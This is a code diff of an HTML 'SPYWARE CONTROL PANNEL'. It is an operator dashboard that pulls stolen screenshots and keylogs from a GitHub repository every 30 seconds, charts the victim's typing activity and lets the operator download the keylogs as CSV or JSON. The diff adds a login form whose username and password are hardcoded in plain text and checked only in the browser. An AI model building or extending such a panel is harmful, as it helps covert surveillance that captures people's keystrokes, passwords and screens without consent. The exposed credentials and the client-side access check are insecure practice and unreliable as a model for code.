@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Monitoring - Latest Screenshot and Keylogs</title>
+    <title>SPYWARE CONTROL PANNEL</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -17,7 +17,7 @@
             color: #2c3e50;
         }
         img {
-            width: 1000px;
+            width: 400px;
             height: auto;
             margin: 10px;
             border: 2px solid #2980b9;
@@ -77,198 +77,240 @@
                 opacity: 1; /* Fade in to full opacity */
             }
         }
+
+        /* Styles for the login form */
+        #login-form {
+            display: none; /* Initially hidden */
+            margin-bottom: 20px;
+        }
+        #login-form input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        #login-form button {
+            background-color: #2980b9;
+            color: white;
+            cursor: pointer;
+        }
+        #login-form button:hover {
+            background-color: #1a5b8a;
+        }
     </style>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script> <!-- Include Chart.js -->
 </head>
 <body>
-    <h1>Remote Monitoring - Latest Screenshot and Keylogs</h1>
-    
-    <button class="toggle-button" onclick="toggleDarkMode()">Toggle Dark Mode</button>
-    
-    <h2>Latest Screenshot</h2>
-    <div id="latest-screenshot">
-        <!-- Latest screenshot will be shown here -->
-        <script>
-            const repo = "https://api.github.com/repos/shrijaybaheti/spyware/contents/screenshots";
+    <h1>SPYWARE CONTROL PANNEL</h1>
 
-            function fetchLatestScreenshot() {
-                fetch(repo)
-                    .then(response => response.json())
-                    .then(data => {
-                        const screenshots = data.filter(file => file.name.endsWith(".png"));
-
-                        if (screenshots.length === 0) {
-                            document.getElementById("latest-screenshot").innerText = "No screenshots available.";
-                            return;
-                        }
-
-                        screenshots.sort((a, b) => {
-                            const aTime = a.name.match(/(\d{8}_\d{6})/)[0];
-                            const bTime = b.name.match(/(\d{8}_\d{6})/)[0];
-                            return bTime.localeCompare(aTime);
-                        });
-
-                        const latestScreenshot = screenshots[0];
-
-                        document.getElementById("latest-screenshot").innerHTML = `<img src="${latestScreenshot.download_url}" alt="Latest Screenshot">`;
-                    })
-                    .catch(error => logError('Error fetching latest screenshot: ' + error));
-            }
-
-            fetchLatestScreenshot(); // Initial fetch
-            setInterval(fetchLatestScreenshot, 30000); // Refresh every 30 seconds
-        </script>
+    <!-- Login Form -->
+    <div id="login-form">
+        <h2>Login</h2>
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="authenticateUser()">Login</button>
     </div>
 
-    <h2>Keylogs</h2>
-    <div id="keylog-content">
-        <!-- Keylog content will be displayed here -->
-        <script>
-            const keylogUrl = "https://raw.githubusercontent.com/shrijaybaheti/spyware/main/logs/keylog.txt";
+    <!-- Main content -->
+    <div id="main-content" style="display: none;">
+        <button class="toggle-button" onclick="toggleDarkMode()">Toggle Dark Mode</button>
 
-            function fetchKeylog() {
-                fetch(keylogUrl)
-                    .then(response => response.text())
-                    .then(data => {
-                        document.getElementById('keylog-content').innerText = data;
-                        updateTimer();
-                        updateActivityChart(data); // Update the chart with the latest keylog data
-                    })
-                    .catch(error => logError('Error fetching keylog: ' + error));
-            }
+        <h2>Latest Screenshot</h2>
+        <div id="latest-screenshot">
+            <!-- Latest screenshot will be shown here -->
+            <script>
+                const repo = "https://api.github.com/repos/shrijaybaheti/spyware/contents/screenshots";
 
-            // Timer for the last update
-            let lastUpdateTime;
-            function updateTimer() {
-                lastUpdateTime = new Date();
-                document.getElementById('timer').innerText = "Last updated: " + lastUpdateTime.toLocaleTimeString();
-            }
+                function fetchLatestScreenshot() {
+                    fetch(repo)
+                        .then(response => response.json())
+                        .then(data => {
+                            const screenshots = data.filter(file => file.name.endsWith(".png"));
 
-            fetchKeylog(); // Initial fetch
-            setInterval(fetchKeylog, 30000); // Refresh every 30 seconds
-
-            // Timer display
-            document.body.insertAdjacentHTML('beforeend', '<div id="timer">Last updated: </div>');
-
-            // Chart for typing activity
-            const ctx = document.createElement('canvas');
-            ctx.id = 'activityChart';
-            document.body.appendChild(ctx);
-            const activityChart = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: [], // Timestamps for x-axis
-                    datasets: [{
-                        label: 'Typing Activity',
-                        data: [], // Data points for y-axis
-                        borderColor: 'rgba(75, 192, 192, 1)',
-                        borderWidth: 2,
-                        fill: false,
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    scales: {
-                        x: {
-                            type: 'time',
-                            time: {
-                                unit: 'minute'
-                            },
-                            title: {
-                                display: true,
-                                text: 'Time'
+                            if (screenshots.length === 0) {
+                                document.getElementById("latest-screenshot").innerText = "No screenshots available.";
+                                return;
                             }
-                        },
-                        y: {
-                            title: {
-                                display: true,
-                                text: 'Key Presses'
+
+                            screenshots.sort((a, b) => {
+                                const aTime = a.name.match(/(\d{8}_\d{6})/)[0];
+                                const bTime = b.name.match(/(\d{8}_\d{6})/)[0];
+                                return bTime.localeCompare(aTime);
+                            });
+
+                            const latestScreenshot = screenshots[0];
+
+                            document.getElementById("latest-screenshot").innerHTML = `<img src="${latestScreenshot.download_url}" alt="Latest Screenshot">`;
+                        })
+                        .catch(error => logError('Error fetching latest screenshot: ' + error));
+                }
+
+                fetchLatestScreenshot(); // Initial fetch
+                setInterval(fetchLatestScreenshot, 30000); // Refresh every 30 seconds
+            </script>
+        </div>
+
+        <h2>Keylogs</h2>
+        <div id="keylog-content">
+            <!-- Keylog content will be displayed here -->
+            <script>
+                const keylogUrl = "https://raw.githubusercontent.com/shrijaybaheti/spyware/main/logs/keylog.txt";
+
+                function fetchKeylog() {
+                    fetch(keylogUrl)
+                        .then(response => response.text())
+                        .then(data => {
+                            document.getElementById('keylog-content').innerText = data;
+                            updateTimer();
+                            updateActivityChart(data); // Update the chart with the latest keylog data
+                        })
+                        .catch(error => logError('Error fetching keylog: ' + error));
+                }
+
+                // Timer for the last update
+                let lastUpdateTime;
+                function updateTimer() {
+                    lastUpdateTime = new Date();
+                    document.getElementById('timer').innerText = "Last updated: " + lastUpdateTime.toLocaleTimeString();
+                }
+
+                fetchKeylog(); // Initial fetch
+                setInterval(fetchKeylog, 30000); // Refresh every 30 seconds
+
+                // Timer display
+                document.body.insertAdjacentHTML('beforeend', '<div id="timer">Last updated: </div>');
+
+                // Chart for typing activity
+                const ctx = document.createElement('canvas');
+                ctx.id = 'activityChart';
+                document.body.appendChild(ctx);
+                const activityChart = new Chart(ctx, {
+                    type: 'line',
+                    data: {
+                        labels: [], // Timestamps for x-axis
+                        datasets: [{
+                            label: 'Typing Activity',
+                            data: [], // Data points for y-axis
+                            borderColor: 'rgba(75, 192, 192, 1)',
+                            borderWidth: 2,
+                            fill: false,
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        scales: {
+                            x: {
+                                type: 'time',
+                                time: {
+                                    unit: 'minute'
+                                },
+                                title: {
+                                    display: true,
+                                    text: 'Time'
+                                }
+                            },
+                            y: {
+                                title: {
+                                    display: true,
+                                    text: 'Key Presses'
+                                }
                             }
                         }
                     }
-                }
-            });
-
-            // Update activity chart based on keylog data
-            function updateActivityChart(keylogData) {
-                const lines = keylogData.trim().split('\n');
-                const timestamps = [];
-                const counts = [];
-
-                lines.forEach(line => {
-                    const [timestamp, ...keys] = line.split(' ');
-                    timestamps.push(timestamp);
-                    counts.push(keys.length); // Count keys for this timestamp
                 });
 
-                activityChart.data.labels = timestamps;
-                activityChart.data.datasets[0].data = counts;
-                activityChart.update();
+                // Update activity chart based on keylog data
+                function updateActivityChart(keylogData) {
+                    const lines = keylogData.trim().split('\n');
+                    const timestamps = [];
+                    const counts = [];
+
+                    lines.forEach(line => {
+                        const [timestamp, ...keys] = line.split(' ');
+                        timestamps.push(timestamp);
+                        counts.push(keys.length); // Count keys for this timestamp
+                    });
+
+                    activityChart.data.labels = timestamps;
+                    activityChart.data.datasets[0].data = counts;
+                    activityChart.update();
+                }
+            </script>
+        </div>
+
+        <h2>Error Logs</h2>
+        <div id="error-logs"></div>
+
+        <script>
+            function logError(errorMessage) {
+                const errorLogs = document.getElementById('error-logs');
+                let log = document.createElement("p");
+                log.innerText = errorMessage;
+                errorLogs.appendChild(log);
+            }
+
+            // Dark mode toggle function
+            function toggleDarkMode() {
+                document.body.classList.toggle("dark-mode");
+            }
+
+            // Download Logs in CSV format
+            function downloadKeylogCSV() {
+                fetch(keylogUrl)
+                    .then(response => response.text())
+                    .then(data => {
+                        const csvData = "Keylog\n" + data.split('\n').map(line => line.includes(',') ? `"${line}"` : line).join('\n');
+                        const blob = new Blob([csvData], { type: 'text/csv' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'keylog.csv';
+                        a.click();
+                        URL.revokeObjectURL(url);
+                    });
+            }
+
+            // Download Logs in JSON format
+            function downloadKeylogJSON() {
+                fetch(keylogUrl)
+                    .then(response => response.text())
+                    .then(data => {
+                        const jsonData = JSON.stringify({ logs: data.split('\n') }, null, 2);
+                        const blob = new Blob([jsonData], { type: 'application/json' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'keylog.json';
+                        a.click();
+                        URL.revokeObjectURL(url);
+                    });
             }
         </script>
+
+        <h2>Download Keylogs</h2>
+        <button class="download-button" onclick="downloadKeylogCSV()">Download as CSV</button>
+        <button class="download-button" onclick="downloadKeylogJSON()">Download as JSON</button>
+
     </div>
 
-    <h2>Error Logs</h2>
-    <div id="error-logs"></div>
-
     <script>
-        function logError(errorMessage) {
-            const errorLogs = document.getElementById('error-logs');
-            let log = document.createElement("p");
-            log.innerText = errorMessage;
-            errorLogs.appendChild(log);
-        }
+        // Show the login form when the page loads
+        document.getElementById('login-form').style.display = 'block';
 
-        // Dark mode toggle function
-        function toggleDarkMode() {
-            document.body.classList.toggle("dark-mode");
-        }
+        // User Authentication
+        function authenticateUser() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-        // User Authentication (Basic Example)
-        const username = prompt("Enter username:");
-        const password = prompt("Enter password:");
-
-        // Replace with your own user validation logic
-        if (username !== "admin" || password !== "password") {
-            alert("Invalid credentials. Access denied.");
-            window.location.reload(); // Reload to block access
-        }
-
-        // Download Logs in CSV format
-        function downloadKeylogCSV() {
-            fetch(keylogUrl)
-                .then(response => response.text())
-                .then(data => {
-                    const csvData = "Keylog\n" + data.split('\n').map(line => line.includes(',') ? `"${line}"` : line).join('\n');
-                    const blob = new Blob([csvData], { type: 'text/csv' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'keylog.csv';
-                    a.click();
-                    URL.revokeObjectURL(url);
-                });
-        }
-
-        // Download Logs in JSON format
-        function downloadKeylogJSON() {
-            fetch(keylogUrl)
-                .then(response => response.text())
-                .then(data => {
-                    const jsonData = JSON.stringify({ logs: data.split('\n') }, null, 2);
-                    const blob = new Blob([jsonData], { type: 'application/json' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'keylog.json';
-                    a.click();
-                    URL.revokeObjectURL(url);
-                });
+            // Replace with your own user validation logic
+            if (username === "shrijay_baheti" && password === "shrijay@2007") {
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+            } else {
+                alert("Invalid credentials. Access denied.");
+            }
         }
     </script>
-
-    <h2>Download Keylogs</h2>
-    <button class="download-button" onclick="downloadKeylogCSV()">Download as CSV</button>
-    <button class="download-button" onclick="downloadKeylogJSON()">Download as JSON</button>
 </body>
 </html>
